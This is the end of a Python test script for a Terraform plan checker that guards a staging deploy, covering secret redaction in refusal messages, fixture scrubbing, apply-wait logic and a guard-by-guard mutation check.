def other_checks():
    wrong = []
    root = HERE.parent
    # A laptop that has run init holds a .terraform folder here. The workflow's fresh checkout has none, and refuses one if committed.
    real = [r for r in pc.check_files([str(root / "envs/staging"), str(root / "modules")]) if "/.terraform: " not in r.text and "/.terraform/" not in r.text]
    if real:
        wrong.append(f"the real config should pass the file check: {real[0].text}")

    # What goes out by email: no values, no account id.
    plan = fresh()
    edit_container(plan, API_TD, lambda c: (set_env(c, "ANTHROPIC_API_KEY", "sk-ant-the-value"), set_env(c, "DISH_FAKE_AI", None), add_secret(c, "CARTESIA_API_KEY", staging_secret("X"))))
    update(plan, ALARM, alarm_actions=["arn:aws:sns:us-west-2:999999999999:leak"])
    text = "\n".join(r.text for r in pc.check_plan(plan, BACKEND))
    for value in ("sk-ant-the-value", ACCOUNT, "999999999999", "leak"):
        if value in text:
            wrong.append(f"a reason leaked {value!r}")

    # The fixtures stay scrubbed.
    for path in (HERE / "fixtures").iterdir():
        content = path.read_text()
        leftovers = (
            "caleb" in content.replace("calebwang26@292613801", ""),
            pc.re.search(r"\b(?!123456789012\b)\d{12}\b", content),
            pc.re.search(r"[\w.+-]+@(?!example\.com)[\w-]+\.[a-z]{2,}", content),
            pc.KEY_VALUE.search(content),
        )
        if any(leftovers):
            wrong.append(f"{path.name} isn't scrubbed")

    # A deploy doesn't go ahead over an apply someone cancelled part way, unless a newer one finished.
    with tempfile.TemporaryDirectory() as tmp:
        script = HERE / "wait-for-apply.sh"
        fake = Path(tmp) / "gh"
        fake.write_text('#!/bin/sh\ncase "$*" in *--commit*) echo "$THIS" ;; *) echo "$NEWER" ;; esac\n')
        fake.chmod(0o755)
        repo = Path(tmp) / "repo"
        repo.mkdir()
        (repo / "infra/modules").mkdir(parents=True)
        git = ["git", "-c", "user.name=t", "-c", "user.email=t@example.com"]
        subprocess.run([*git, "init", "-q"], cwd=repo, check=True)
        subprocess.run([*git, "commit", "-q", "--allow-empty", "-m", "a"], cwd=repo, check=True)
        (repo / "infra/modules/x.tf").write_text("#")
        subprocess.run([*git, "add", "."], cwd=repo, check=True)
        subprocess.run([*git, "commit", "-q", "-m", "b"], cwd=repo, check=True)
        at = "2026-11-01T00:00:00Z"
        for this, newer, want in (
            (f"completed success {at}", "", 0),
            (f"completed failure {at}", "", 1),
            (f"completed cancelled {at}", "", 1),
            (f"completed cancelled {at}", "completed failure", 1),
            (f"completed cancelled {at}", "completed success", 0),
            (f"completed cancelled {at}", "completed cancelled,completed success", 0),
        ):
            env = {**os.environ, "PATH": f"{tmp}:{os.environ['PATH']}", "APPLY_SWITCH": "on", "GITHUB_SHA": "x", "THIS": this, "NEWER": newer, "APPLY_POLL_S": "0"}
            done = subprocess.run(["bash", str(script)], cwd=repo, env=env, capture_output=True, text=True, timeout=60)
            if done.returncode != want:
                wrong.append(f"wait-for-apply: {this!r} with newer {newer!r} should exit {want}, got {done.returncode}")

    # A refusal has to fail its step by itself, whatever the shell's defaults are.
    workflow_text = (root.parent / ".github/workflows/apply-staging.yml").read_text()
    if "| tee" in workflow_text:
        wrong.append("a step pipes the check through tee, so a refusal depends on pipefail")

    # One Terraform version, everywhere it's pinned.
    workflow = (root.parent / ".github/workflows/apply-staging.yml").read_text()
    if f'terraform_version: "{pc.TERRAFORM_VERSION}"' not in workflow:
        wrong.append("the workflow pins a different Terraform version from plan_check.py")

    # A plan or a backend record that can't be read refuses, through the command line, the way the workflow calls it.
    with tempfile.TemporaryDirectory() as tmp:
        good_plan = HERE / "fixtures/staging-plan.json"
        good_backend = HERE / "fixtures/backend.json"
        bad = Path(tmp) / "bad.json"
        bad.write_text("not json")
        empty = Path(tmp) / "empty.json"
        empty.write_text("{}")
        broken = Path(tmp) / "broken.json"
        broken.write_text('{"resource_changes": [{}]}')
        for args, want in (
            ((good_plan, good_backend), 0),
            ((bad, good_backend), 1),
            ((good_plan, bad), 1),
            ((empty, good_backend), 1),
            ((broken, good_backend), 1),
            ((good_plan, Path(tmp) / "missing.json"), 1),
        ):
            done = subprocess.run([sys.executable, str(HERE / "plan_check.py"), "plan", str(args[0]), "--backend", str(args[1])], capture_output=True)
            if done.returncode != want:
                wrong.append(f"command line: {args[0].name} {args[1].name} exited {done.returncode}, wanted {want}")
    return wrong


def main():
    wrong = [w for w, _ in failures()] + other_checks()
    for w in wrong:
        print("FAIL", w)
    print(f"{len(ALLOWED)} allowed cases, {len(REFUSED)} refused plan cases, {len(FILE_CASES)} refused file cases: {len(wrong)} wrong")
    if wrong:
        return 1

    print("\nEach guard switched off in turn:")
    print("  cases that then fail | of those, let through entirely | guard")
    silent = []
    for table, name_of_arg in ((pc.PLAN_GUARDS, "plan"), (pc.FILE_GUARDS, "file")):
        for item in table:
            rest = [g for g in table if g is not item]
            found = failures(rest, None) if name_of_arg == "plan" else failures(None, rest)
            through = sum(1 for _, passed in found if passed)
            print(f"  {len(found):>21} | {through:>30} | {item[0]}")
            if not found:
                silent.append(item[0])
    if silent:
        print("FAIL no test notices these guards missing:", ", ".join(silent))
        return 1
    print(f"Every guard ({len(pc.PLAN_GUARDS) + len(pc.FILE_GUARDS)}) has a test that fails without it.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
